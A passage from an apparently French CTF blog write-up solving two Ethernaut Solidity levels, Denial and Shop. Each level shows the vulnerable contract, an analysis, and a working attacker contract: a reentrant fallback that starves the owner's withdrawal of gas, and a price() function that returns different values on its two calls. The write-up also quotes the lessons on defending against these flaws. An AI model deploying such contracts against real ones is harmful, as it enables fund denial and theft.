  <p>Utilisation d’un <code class="highlighter-rouge">call</code> pour réaliser un transfert. On réalise une Re-entracy attaque pour appeler plusieurs fois <code class="highlighter-rouge">withdraw()</code>.</p>
</blockquote>

<p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>

<p>If you can deny the owner from withdrawing funds when they call <code class="highlighter-rouge">withdraw()</code> (whilst the contract still has funds) you will win this level.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Denial</span> <span class="p">{</span>

    <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">partner</span><span class="p">;</span> <span class="c1">// withdrawal partner - pay the gas, split the withdraw</span>
    <span class="nx">address</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="nx">constant</span> <span class="nx">owner</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span>
    <span class="nx">uint</span> <span class="nx">timeLastWithdrawn</span><span class="p">;</span>
    <span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">withdrawPartnerBalances</span><span class="p">;</span> <span class="c1">// keep track of partners balances</span>

    <span class="kd">function</span> <span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_partner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">partner</span> <span class="o">=</span> <span class="nx">_partner</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// withdraw 1% to recipient and 1% to owner</span>
    <span class="kd">function</span> <span class="nx">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">uint</span> <span class="nx">amountToSend</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">.</span><span class="nx">div</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
        <span class="c1">// perform a call without checking return</span>
        <span class="c1">// The recipient can revert, the owner will still get their share</span>
        <span class="nx">partner</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">)(</span><span class="s2">""</span><span class="p">);</span>
        <span class="nx">owner</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">);</span>
        <span class="c1">// keep track of last withdrawal time</span>
        <span class="nx">timeLastWithdrawn</span> <span class="o">=</span> <span class="nx">now</span><span class="p">;</span>
        <span class="nx">withdrawPartnerBalances</span><span class="p">[</span><span class="nx">partner</span><span class="p">]</span> <span class="o">=</span> <span class="nx">withdrawPartnerBalances</span><span class="p">[</span><span class="nx">partner</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// allow deposit of funds</span>
    <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{}</span>

    <span class="c1">// convenience function</span>
    <span class="kd">function</span> <span class="nx">contractBalance</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-19">Analyse</h3>

<p>Le but de ce niveau est de faire en sorte que lors d’un appel à <code class="highlighter-rouge">withdraw()</code>, l’instruction <code class="highlighter-rouge">partner.call.value(amountToSend)("");</code> soit exécutée normalement, et que <code class="highlighter-rouge">owner.transfer(amountToSend);</code> ne soit pas exécutée, de cette manière <code class="highlighter-rouge">owner</code> ne recevra pas de part.</p>

<p>On peut voir que le smart contract utilise <code class="highlighter-rouge">call</code> pour réaliser le transfert sans vérification sur l’adresse du <code class="highlighter-rouge">partner</code>. On peut alors réaliser une Re-entrancy attack classique.</p>

<h3 id="attaque-16">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
    <span class="nx">Denial</span> <span class="kr">public</span> <span class="nx">object</span><span class="p">;</span>
    
    <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span> <span class="nx">addr</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">object</span> <span class="o">=</span> <span class="nx">Denial</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="nx">becomePartner</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">object</span><span class="p">.</span><span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="nx">go</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">object</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
    <span class="p">}</span>
    
    <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">object</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.</p>

  <p>If you are using a low level <code class="highlighter-rouge">call</code> to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example <code class="highlighter-rouge">call.gas(100000).value()</code>.</p>

  <p>Typically one should follow the <a href="http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern">checks-effects-interactions</a> pattern to avoid reentrancy attacks, there can be other circumstances  (such as multiple external calls at the end of a function) where issues  such as this can arise.</p>
</blockquote>

<hr />

<h2 id="21---shop">21 - Shop</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Créer une fonction que retourne des valeurs différentes.</p>
</blockquote>

<p>Сan you get the item from the shop for less than the price asked?</p>

<h5 id="things-that-might-help-3">Things that might help:</h5>

<ul>
  <li><code class="highlighter-rouge">Shop</code> expects to be used from a <code class="highlighter-rouge">Buyer</code></li>
  <li>Understanding how <code class="highlighter-rouge">gas()</code> options works</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="kr">interface</span> <span class="nx">Buyer</span> <span class="p">{</span>
  <span class="kd">function</span> <span class="nx">price</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Shop</span> <span class="p">{</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">price</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">isSold</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nx">buy</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">Buyer</span> <span class="nx">_buyer</span> <span class="o">=</span> <span class="nx">Buyer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">_buyer</span><span class="p">.</span><span class="nx">price</span><span class="p">.</span><span class="nx">gas</span><span class="p">(</span><span class="mi">3000</span><span class="p">)()</span> <span class="o">&gt;=</span> <span class="nx">price</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">isSold</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">isSold</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
      <span class="nx">price</span> <span class="o">=</span> <span class="nx">_buyer</span><span class="p">.</span><span class="nx">price</span><span class="p">.</span><span class="nx">gas</span><span class="p">(</span><span class="mi">3000</span><span class="p">)();</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-20">Analyse</h3>

<p>Le but de ce niveau est de modifier la valeur de <code class="highlighter-rouge">price</code>.</p>

<p>Lors d’un appel à <code class="highlighter-rouge">buy()</code>, on récupère la valeur de <code class="highlighter-rouge">price</code> à deux reprises. La premier au seins du <code class="highlighter-rouge">if</code> avec <code class="highlighter-rouge">_buyer.price.gas(3000)() &gt;= price</code>, sur cette dernière on s’assure que le <code class="highlighter-rouge">price</code> est supérieur à <code class="highlighter-rouge">100</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">price</span> <span class="o">=</span> <span class="nx">_buyer</span><span class="p">.</span><span class="nx">price</span><span class="p">.</span><span class="nx">gas</span><span class="p">(</span><span class="mi">3000</span><span class="p">)();</span>
</code></pre></div></div>

<p>La second appel à <code class="highlighter-rouge">price()</code> permet de définir la nouvelle valeur de <code class="highlighter-rouge">price</code>.</p>

<p>On comprend que le valeur de <code class="highlighter-rouge">price</code> ne peut que augmenter alors que nous voulons la réduire.</p>

<p>Pour la réduire, nous devons définir une fonction <code class="highlighter-rouge">price()</code> qui va retourner une valeur &gt; 100 lors de son premier appel, puis une valeur &lt; 100 lors de son second appel.</p>

<h3 id="attaque-17">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="nx">is</span> <span class="nx">Buyer</span> <span class="p">{</span>
  <span class="nx">Shop</span> <span class="nx">object</span><span class="p">;</span>
    
  <span class="kd">function</span> <span class="nx">go</span><span class="p">(</span><span class="nx">address</span> <span class="nx">addr</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
      <span class="nx">object</span> <span class="o">=</span> <span class="nx">Shop</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
      <span class="nx">object</span><span class="p">.</span><span class="nx">buy</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">price</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">Shop</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">isSold</span><span class="p">()</span> <span class="p">?</span> <span class="mi">0</span><span class="p">:</span> <span class="mi">101</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// before</span>
<span class="o">&gt;</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">price</span><span class="p">()).</span><span class="nx">toString</span><span class="p">()</span>
<span class="s2">"100"</span>

<span class="c1">// after</span>
<span class="o">&gt;</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">price</span><span class="p">()).</span><span class="nx">toString</span><span class="p">()</span>
<span class="s2">"0"</span>
</code></pre></div></div>

<blockquote>
  <p>Contracts can manipulate with the data from other contracts the way they want.</p>

  <p>It’s unsafe to approve some action by double calling even the same view function.</p>
</blockquote>

<hr />

<p>Other writeups:</p>

<ul>
  <li><a href="https://listed.to/@r1oga">https://listed.to/@r1oga</a></li>
</ul>

</div>


<div class="related">
  <h2>Related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/linux/2019/12/23/ctf-santhacklaus/">
            santhacklaus ctf v2
            <small>23 Dec 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/ctf/2019/12/05/sigsegv2/">
            sigsegv2
            <small>05 Dec 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/ctf/2019/07/29/linux/">
            linux
            <small>29 Jul 2019</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>


      </div>
    </div>

    <label for="sidebar-checkbox" class="sidebar-toggle"></label>

    <script src='/public/js/script.js'></script>
  </body>
</html>
